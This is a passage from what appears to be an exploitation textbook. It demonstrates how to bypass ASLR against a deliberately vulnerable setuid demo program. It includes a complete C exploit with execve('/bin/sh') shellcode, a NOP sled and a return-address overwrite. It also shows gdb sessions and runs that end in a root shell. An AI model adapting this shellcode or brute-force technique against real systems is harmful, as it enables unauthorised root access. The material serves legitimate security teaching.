Using execl() at least limits the randomness and gives us a ballpark address range
The remaining uncertainty can be handled with a NOP sled
A quick examination of aslr_demo shows that the overflow buffer needs to be 80 bytes to overwrite the stored return address on the stack

__________________________________________________________________________________
reader@hacking:~/booksrc $ gdb -q ./aslr_demo
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) run $(perl -e 'print "AAAA"x19 . "BBBB"')
Starting program: /home/reader/booksrc/aslr_demo $(perl -e 'print "AAAA"x19 . "BBBB"')
buffer is at 0xbfc7d3b0

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) p 20*4
$1 = 80
(gdb) quit
The program is running. Exit anyway? (y or n) y
__________________________________________________________________________________

Since we will probably want a rather large NOP sled, in the following exploit the NOP sled and the shellcode will be put after the return address overwrite
This allows us to inject as much of a NOP sled as needed
In this case, a thousand bytes or so should be sufficient

aslr_execl_exploit.c
__________________________________________________________________________________
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char shellcode[]= 
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80"; // standard shellcode

int main(int argc, char *argv[]) {
   unsigned int i, ret, offset;
   char buffer[1000];

   printf("i is at %p\n", &i);

   if(argc > 1) // Set offset
      offset = atoi(argv[1]);

   ret = (unsigned int) &i - offset + 200; // Set return address
   printf("ret addr is %p\n", ret);
   
   for(i=0; i < 90; i+=4) // Fill buffer with return address
      *((unsigned int *)(buffer+i)) = ret;
   memset(buffer+84, 0x90, 900); // Build NOP sled
   memcpy(buffer+900, shellcode, sizeof(shellcode));

   execl("./aslr_demo", "aslr_demo", buffer, NULL);
}
__________________________________________________________________________________

This code should make sense to you
The value 200 is added to the return address to skip over the first 90 bytes used for the overwrite, so execution lands somewhere in the NOP sled

__________________________________________________________________________________
reader@hacking:~/booksrc $ sudo chown root ./aslr_demo
reader@hacking:~/booksrc $ sudo chmod u+s ./aslr_demo
reader@hacking:~/booksrc $ gcc aslr_execl_exploit.c
reader@hacking:~/booksrc $ ./a.out
i is at 0xbfa3f26c
ret addr is 0xb79f6de4
buffer is at 0xbfa3ee80
Segmentation fault

reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xbfa3f26c - 0xbfa3ee80"
$1 = 1004

reader@hacking:~/booksrc $ ./a.out 1004
i is at 0xbfe9b6cc
ret addr is 0xbfe9b3a8
buffer is at 0xbfe9b2e0
sh-3.2# exit
exit

reader@hacking:~/booksrc $ ./a.out 1004
i is at 0xbfb5a38c
ret addr is 0xbfb5a068
buffer is at 0xbfb20760
Segmentation fault

reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xbfb5a38c - 0xbfb20760"
$1 = 236588

reader@hacking:~/booksrc $ ./a.out 1004
i is at 0xbfce050c
ret addr is 0xbfce01e8
buffer is at 0xbfce0130
sh-3.2# whoami
root
sh-3.2#
__________________________________________________________________________________

As you can see, occassionally the randomization causes the exploit to fail, but it only needs to succeed once
This leverages the fact that we can try the exploit as many times as we want
The same technique will work with the notesearch exploit while ASLR is running
Try writing an exploit to do this

Once the basic concepts of exploiting programs are understood, countless variations are possible with a little bit of creativity
Since the rules of a program are defined by its creators, exploiting a supposedly secure program is simply a matter of beating them at their own game
New clever methods, such as stack guards and IDSs, try to compensate for these problems, but these solutions aren't perfect either
A hacker's ingenuity tends to find holes in these systems
Just think of the things they didn't think of